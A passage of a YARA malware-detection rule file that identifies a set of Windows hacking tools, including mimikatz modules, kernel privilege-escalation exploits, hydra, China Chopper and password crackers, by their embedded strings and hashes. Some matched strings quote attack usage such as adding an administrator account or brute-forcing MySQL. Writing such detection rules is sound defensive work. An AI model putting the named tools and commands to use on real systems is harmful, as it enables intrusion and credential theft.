and filesize < 14KB and all of ($s*)\n}\n\nrule Dos_NtGod {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NtGod.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"adefd901d6bbd8437116f0170b9c28a76d4a87bf\"\n\tstrings:\n\t\t$s0 = \"\\\\temp\\\\NtGodMode.exe\" ascii\n\t\t$s4 = \"NtGodMode.exe\" fullword ascii\n\t\t$s10 = \"ntgod.bat\" fullword ascii\n\t\t$s19 = \"sfxcmd\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule CN_Tools_VNCLink {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file VNCLink.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"cafb531822cbc0cfebbea864489eebba48081aa1\"\n\tstrings:\n\t\t$s1 = \"C:\\\\temp\\\\vncviewer4.log\" fullword ascii\n\t\t$s2 = \"[BL4CK] Patched by redsand || http://blacksecurity.org\" fullword ascii\n\t\t$s3 = \"fake release extendedVkey 0x%x, keysym 0x%x\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 580KB and 2 of them\n}\n\nrule tools_NTCmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NTCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a3ae8659b9a673aa346a60844208b371f7c05e3c\"\n\tstrings:\n\t\t$s1 = \"pipecmd \\\\\\\\%s -U:%s -P:\\\"\\\" %s\" fullword ascii\n\t\t$s2 = \"[Usage]:  %s <HostName|IP> <Username> <Password>\" fullword ascii\n\t\t$s3 = \"pipecmd \\\\\\\\%s -U:%s -P:%s %s\" fullword ascii\n\t\t$s4 = \"============By uhhuhy (Feb 18,2003) - http://www.cnhonker.net============\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s5 = \"=======================NTcmd v0.11 for HScan v1.20=======================\" fullword ascii\n\t\t$s6 = \"NTcmd>\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 80KB and 2 of them\n}\n\nrule mysql_pwd_crack {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file mysql_pwd_crack.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"57d1cb4d404688804a8c3755b464a6e6248d1c73\"\n\tstrings:\n\t\t$s1 = \"mysql_pwd_crack 127.0.0.1 -x 3306 -p root -d userdict.txt\" fullword ascii\n\t\t$s2 = \"Successfully --> username %s password %s \" fullword ascii\n\t\t$s3 = \"zhouzhen@gmail.com http://zhouzhen.eviloctal.org\" fullword ascii\n\t\t$s4 = \"-a automode  automatic crack the mysql password \" fullword ascii\n\t\t$s5 = \"mysql_pwd_crack 127.0.0.1 -x 3306 -a\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule CmdShell64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file CmdShell64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5b92510475d95ae5e7cd6ec4c89852e8af34acf1\"\n\tstrings:\n\t\t$s1 = \"C:\\\\Windows\\\\System32\\\\JAVASYS.EXE\" fullword wide\n\t\t$s2 = \"ServiceCmdShell\" fullword ascii\n\t\t$s3 = \"<!-- If your application is designed to work with Windows 8.1, uncomment the fol\" ascii\n\t\t$s4 = \"ServiceSystemShell\" fullword wide\n\t\t$s5 = \"[Root@CmdShell ~]#\" fullword wide\n\t\t$s6 = \"Hello Man 2015 !\" fullword wide\n\t\t$s7 = \"CmdShell\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 30KB and 4 of them\n}\n\nrule Ms_Viru_v {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file v.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ecf4ba6d1344f2f3114d52859addee8b0770ed0d\"\n\tstrings:\n\t\t$s1 = \"c:\\\\windows\\\\system32\\\\command.com /c \" fullword ascii\n\t\t$s2 = \"Easy Usage Version -- Edited By: racle@tian6.com\" fullword ascii\n\t\t$s3 = \"OH,Sry.Too long command.\" fullword ascii\n\t\t$s4 = \"Success! Commander.\" fullword ascii\n\t\t$s5 = \"Hey,how can racle work without ur command ?\" fullword ascii\n\t\t$s6 = \"The exploit thread was unable to map the virtual 8086 address space\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule CN_Tools_Vscan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Vscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"0365fe05e2de0f327dfaa8cd0d988dbb7b379612\"\n\tstrings:\n\t\t$s1 = \"[+] Usage: VNC_bypauth <target> <scantype> <option>\" fullword ascii\n\t\t$s2 = \"========RealVNC <= 4.1.1 Bypass Authentication Scanner=======\" fullword ascii\n\t\t$s3 = \"[+] Type VNC_bypauth <target>,<scantype> or <option> for more informations\" fullword ascii\n\t\t$s4 = \"VNC_bypauth -i 192.168.0.1,192.168.0.2,192.168.0.3,...\" fullword ascii\n\t\t$s5 = \"-vn:%-15s:%-7d  connection closed\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 60KB and 2 of them\n}\n\nrule Dos_iis {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file iis.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"61ffd2cbec5462766c6f1c44bd44eeaed4f3d2c7\"\n\tstrings:\n\t\t$s1 = \"comspec\" fullword ascii\n\t\t$s2 = \"program terming\" fullword ascii\n\t\t$s3 = \"WinSta0\\\\Defau\" fullword ascii\n\t\t$s4 = \"* FROM IIsWebInfo\" ascii\n\t\t$s5 = \"www.icehack.\" ascii\n\t\t$s6 = \"wmiprvse.exe\" fullword ascii\n\t\t$s7 = \"Pid: %d\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 70KB and all of them\n}\n\nrule IISPutScannesr {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IISPutScannesr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2dd8fee20df47fd4eed5a354817ce837752f6ae9\"\n\tstrings:\n\t\t$s1 = \"yoda & M.o.D.\" ascii\n\t\t$s2 = \"-> come.to/f2f **************\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule Generate {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Generate.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2cb4c3916271868c30c7b4598da697f59e9c7a12\"\n\tstrings:\n\t\t$s1 = \"C:\\\\TEMP\\\\\" fullword ascii\n\t\t$s2 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n\t\t$s3 = \"$530 Please login with USER and PASS.\" fullword ascii\n\t\t$s4 = \"_Shell.exe\" fullword ascii\n\t\t$s5 = \"ftpcWaitingPassword\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2000KB and 3 of them\n}\n\nrule Pc_rejoice {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file rejoice.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372\"\n\tstrings:\n\t\t$s1 = \"@members.3322.net/dyndns/update?system=dyndns&hostname=\" fullword ascii\n\t\t$s2 = \"http://www.xxx.com/xxx.exe\" fullword ascii\n\t\t$s3 = \"@ddns.oray.com/ph/update?hostname=\" fullword ascii\n\t\t$s4 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n\t\t$s5 = \"ListViewProcessListColumnClick!\" fullword ascii\n\t\t$s6 = \"http://iframe.ip138.com/ic.asp\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and 3 of them\n}\n\nrule ms11080_withcmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11080_withcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"745e5058acff27b09cfd6169caf6e45097881a49\"\n\tstrings:\n\t\t$s1 = \"Usage : ms11-080.exe cmd.exe Command \" fullword ascii\n\t\t$s2 = \"\\\\ms11080\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n\t\t$s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n\t\t$s4 = \"[>] create porcess error\" fullword ascii\n\t\t$s5 = \"[>] ms11-080 Exploit\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and 1 of them\n}\n\nrule OtherTools_xiaoa {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xiaoa.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6988acb738e78d582e3614f83993628cf92ae26d\"\n\tstrings:\n\t\t$s1 = \"Usage:system_exp.exe \\\"cmd\\\"\" fullword ascii\n\t\t$s2 = \"The shell \\\"cmd\\\" success!\" fullword ascii\n\t\t$s3 = \"Not Windows NT family OS.\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s4 = \"Unable to get kernel base address.\" fullword ascii\n\t\t$s5 = \"run \\\"%s\\\" failed,code: %d\" fullword ascii\n\t\t$s6 = \"Windows Kernel Local Privilege Exploit \" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule unknown2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file unknown2.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"32508d75c3d95e045ddc82cb829281a288bd5aa3\"\n\tstrings:\n\t\t$s1 = \"http://md5.com.cn/index.php/md5reverse/index/md/\" fullword wide\n\t\t$s2 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n\t\t$s3 = \"http://www.md5.com.cn\" fullword wide\n\t\t$s4 = \"1.5.exe\" fullword wide\n\t\t$s5 = \"\\\\Set.ini\" fullword wide\n\t\t$s6 = \"OpenFileDialog1\" fullword wide\n\t\t$s7 = \" (*.txt)|*.txt\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and 4 of them\n}\n\nrule hydra_7_3_hydra {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hydra.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2f82b8bf1159e43427880d70bcd116dc9e8026ad\"\n\tstrings:\n\t\t$s1 = \"[ATTEMPT-ERROR] target %s - login \\\"%s\\\" - pass \\\"%s\\\" - child %d - %lu of %lu\" fullword ascii\n\t\t$s2 = \"(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE\" ascii\n\t\t$s3 = \"cn=^USER^,cn=users,dc=foo,dc=bar,dc=com for domain foo.bar.com\" fullword ascii\n\t\t$s4 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n\t\t$s5 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 700KB and 1 of them\n}\n\nrule OracleScan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file OracleScan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"10ff7faf72fe6da8f05526367b3522a2408999ec\"\n\tstrings:\n\t\t$s1 = \"MYBLOG:HTTP://HI.BAIDU.COM/0X24Q\" fullword ascii\n\t\t$s2 = \"\\\\Borland\\\\Delphi\\\\RTL\" fullword ascii\n\t\t$s3 = \"USER_NAME\" ascii\n\t\t$s4 = \"FROMWWHERE\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule SQLTools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SQLTools.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"38a9caa2079afa2c8d7327e7762f7ed9a69056f7\"\n\tstrings:\n\t\t$s1 = \"DBN_POST\" fullword wide\n\t\t$s2 = \"LOADER ERROR\" fullword ascii\n\t\t$s3 = \"www.1285.net\" fullword wide\n\t\t$s4 = \"TUPFILEFORM\" fullword wide\n\t\t$s5 = \"DBN_DELETE\" fullword wide\n\t\t$s6 = \"DBINSERT\" fullword wide\n\t\t$s7 = \"Copyright (C) Kibosoft Corp. 2001-2006\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2350KB and all of them\n}\n\nrule portscanner {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file portscanner.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1de367d503fdaaeee30e8ad7c100dd1e320858a4\"\n\tstrings:\n\t\t$s0 = \"PortListfNo\" fullword ascii\n\t\t$s1 = \".533.net\" fullword ascii\n\t\t$s2 = \"CRTDLL.DLL\" fullword ascii\n\t\t$s3 = \"exitfc\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule kappfree {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kappfree.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\tstrings:\n\t\t$s1 = \"Bienvenue dans un processus distant\" fullword wide\n\t\t$s2 = \"kappfree.dll\" fullword ascii\n\t\t$s3 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule Smartniff {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Smartniff.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"67609f21d54a57955d8fe6d48bc471f328748d0a\"\n\tstrings:\n\t\t$s1 = \"smsniff.exe\" fullword wide\n\t\t$s2 = \"support@nirsoft.net0\" fullword ascii\n\t\t$s3 = \"</requestedPrivileges></security></trustInfo></assembly>\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChinaChopper_caidao {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file caidao.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"056a60ec1f6a8959bfc43254d97527b003ae5edb\"\n\tstrings:\n\t\t$s1 = \"Pass,Config,n{)\" fullword ascii\n\t\t$s2 = \"phMYSQLZ\" fullword ascii\n\t\t$s3 = \"\\\\DHLP\\\\.\" fullword ascii\n\t\t$s4 = \"\\\\dhlp\\\\.\" fullword ascii\n\t\t$s5 = \"SHAutoComple\" fullword ascii\n\t\t$s6 = \"MainFrame\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1077KB and all of them\n}\n\nrule KiwiTaskmgr_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file KiwiTaskmgr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\tstrings:\n\t\t$s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n\t\t$s2 = \"Kiwi Taskmgr no-gpo\" fullword wide\n\t\t$s3 = \"KiwiAndTaskMgr\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule kappfree_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kappfree.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\tstrings:\n\t\t$s1 = \"kappfree.dll\" fullword ascii\n\t\t$s2 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n\t\t$s3 = \"' introuvable !\" fullword wide\n\t\t$s4 = \"kiwi\\\\mimikatz\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule x_way2_5_sqlcmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5152a57e3638418b0d97a42db1c0fc2f893a2794\"\n\tstrings:\n\t\t$s1 = \"LOADER ERROR\" fullword ascii\n\t\t$s2 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s3 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s4 = \"kernel32.dll\" fullword ascii\n\t\t$s5 = \"VirtualAlloc\" fullword ascii\n\t\t$s6 = \"VirtualFree\" fullword ascii\n\t\t$s7 = \"VirtualProtect\" fullword ascii\n\t\t$s8 = \"ExitProcess\" fullword ascii\n\t\t$s9 = \"user32.dll\" fullword ascii\n\t\t$s16 = \"MessageBoxA\" fullword ascii\n\t\t$s10 = \"wsprintfA\" fullword ascii\n\t\t$s11 = \"kernel32.dll\" fullword ascii\n\t\t$s12 = \"GetProcAddress\" fullword ascii\n\t\t$s13 = \"GetModuleHandleA\" fullword ascii\n\t\t$s14 = \"LoadLibraryA\" fullword ascii\n\t\t$s15 = \"odbc32.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them\n}\n\nrule Win32_klock {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file klock.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"7addce4434670927c4efaa560524680ba2871d17\"\n\tstrings:\n\t\t$s1 = \"klock.dll\" fullword ascii\n\t\t$s2 = \"Erreur : impossible de basculer le bureau ; SwitchDesktop : \" fullword wide\n\t\t$s3 = \"klock de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule ipsearcher {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ipsearcher.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"1e96e9c5c56fcbea94d26ce0b3f1548b224a4791\"\n\tstrings:\n\t\t$s0 = \"http://www.wzpg.com\" fullword ascii\n\t\t$s1 = \"ipsearcher\\\\ipsearcher\\\\Release\\\\ipsearcher.pdb\" fullword ascii\n\t\t$s3 = \"_GetAddress\" fullword ascii\n\t\t$s5 = \"ipsearcher.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 140KB and all of them\n}\n\nrule ms10048_x64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms10048-x64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"418bec3493c85e3490e400ecaff5a7760c17a0d0\"\n\tstrings:\n\t\t$s1 = \"The target is most likely patched.\" fullword ascii\n\t\t$s2 = \"Dojibiron by Ronald Huizer, (c) master#h4cker.us  \" fullword ascii\n\t\t$s3 = \"[ ] Creating evil window\" fullword ascii\n\t\t$s4 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and 1 of them\n}\n\nrule hscangui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscangui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"af8aced0a78e1181f4c307c78402481a589f8d07\"\n\tstrings:\n\t\t$s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n\t\t$s2 = \"http://www.cnhonker.com\" fullword ascii\n\t\t$s3 = \"%s@ftpscan#Cracked account:  %s/%s\" fullword ascii\n\t\t$s4 = \"[%s]: Found \\\"FTP account: %s/%s\\\" !!!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule GoodToolset_ms11080 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11080.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f0854c49eddf807f3a7381d3b20f9af4a3024e9f\"\n\tstrings:\n\t\t$s1 = \"[*] command add user 90sec 90sec\" fullword ascii\n\t\t$s2 = \"\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n\t\t$s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n\t\t$s4 = \"[*] Add to Administrators success\" fullword ascii\n\t\t$s5 = \"[*] User has been successfully added\" fullword ascii\n\t\t$s6 = \"[>] ms11-08 Exploit\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule epathobj_exp64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file epathobj_exp64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"09195ba4e25ccce35c188657957c0f2c6a61d083\"\n\tstrings:\n\t\t$s1 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n\t\t$s2 = \"Exploit ok run command\" fullword ascii\n\t\t$s3 = \"\\\\epathobj_exp\\\\x64\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n\t\t$s4 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n\t\t$s5 = \"Mutex object did not timeout, list not patched\" fullword ascii\n\t\t$s6 = \"- inconsistent onexit begin-end variables\" fullword wide  /* Goodware String - occured 96 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and 2 of them\n}\n\nrule kelloworld_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file kelloworld.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\tstrings:\n\t\t$s1 = \"Hello World!\" fullword wide\n\t\t$s2 = \"kelloworld.dll\" fullword ascii\n\t\t$s3 = \"kelloworld de mimikatz pour Windows\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule HScan_v1_20_hscan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"568b06696ea0270ee1a744a5ac16418c8dacde1c\"\n\tstrings:\n\t\t$s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n\t\t$s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100\" fullword ascii\n\t\t$s3 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s4 = \".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s5 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule _Project1_Generate_rejoice {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"d1a5e3b646a16a7fcccf03759bd0f96480111c96\"\n\t\thash1 = \"2cb4c3916271868c30c7b4598da697f59e9c7a12\"\n\t\thash2 = \"fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372\"\n\tstrings:\n\t\t$s1 = \"sfUserAppDataRoaming\" fullword ascii\n\t\t$s2 = \"$TRzFrameControllerPropertyConnection\" fullword ascii\n\t\t$s3 = \"delphi32.exe\" fullword ascii\n\t\t$s4 = \"hkeyCurrentUser\" fullword ascii\n\t\t$s5 = \"%s is not a valid IP address.\" fullword wide\n\t\t$s6 = \"Citadel hooking error\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule _hscan_hscan_hscangui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"17a743e40790985ececf5c66eaad2a1f8c4cffe8\"\n\t\thash1 = \"568b06696ea0270ee1a744a5ac16418c8dacde1c\"\n\t\thash2 = \"af8aced0a78e1181f4c307c78402481a589f8d07\"\n\tstrings:\n\t\t$s1 = \".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s2 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s3 = \"[%s]: checking \\\"FTP account: ftp/ftp@ftp.net\\\" ...\" fullword ascii\n\t\t$s4 = \"[%s]: IPC NULL session connection success !!!\" fullword ascii\n\t\t$s5 = \"Scan %d targets,use %4.1f minutes\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and all of them\n}\n\nrule kiwi_tools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\t\thash1 = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\t\thash2 = \"7ac7541e20af7755b7d8141c5c1b7432465cabd8\"\n\t\thash3 = \"9fbfe3eb49d67347ab57ae743f7542864bc06de6\"\n\t\thash4 = \"5c90d648c414bdafb549291f95fe6f27c0c9b5ec\"\n\t\thash5 = \"7addce4434670927c4efaa560524680ba2871d17\"\n\t\thash6 = \"28c5c0bdb7786dc2771672a2c275be7d9b742ec7\"\n\t\thash7 = \"b5c93489a1b62181594d0fb08cc510d947353bc8\"\n\t\thash8 = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\t\thash9 = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\t\thash10 = \"febadc01a64a071816eac61a85418711debaf233\"\n\t\thash11 = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\t\thash12 = \"56a61c808b311e2225849d195bbeb69733efe49a\"\n\t\thash13 = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\t\thash14 = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\t\thash15 = \"f661d6516d081c37ab7da0f4ec21b2cc6a9257c6\"\n\t\thash16 = \"20facf1fa2d87cccf177403ca1a7852128a9a0ab\"\n\t\thash17 = 